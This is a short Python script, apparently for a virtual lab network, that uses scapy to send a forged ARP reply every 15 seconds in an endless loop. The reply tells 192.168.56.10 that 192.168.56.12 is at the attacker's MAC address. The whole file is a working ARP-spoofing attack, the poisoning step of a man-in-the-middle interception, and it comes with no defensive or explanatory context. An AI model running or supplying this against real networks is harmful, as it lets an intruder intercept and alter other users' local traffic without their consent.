#!/usr/bin/python3

import scapy.all as scapy
from time import sleep

while True:
    arp_spoof=scapy.ARP(psrc="192.168.56.12", pdst="192.168.56.10", hwsrc="08:00:27:e5:70:cd", hwdst="08:00:27:90:ce:e9", op="is-at")
    scapy.send(arp_spoof)
    sleep(15)
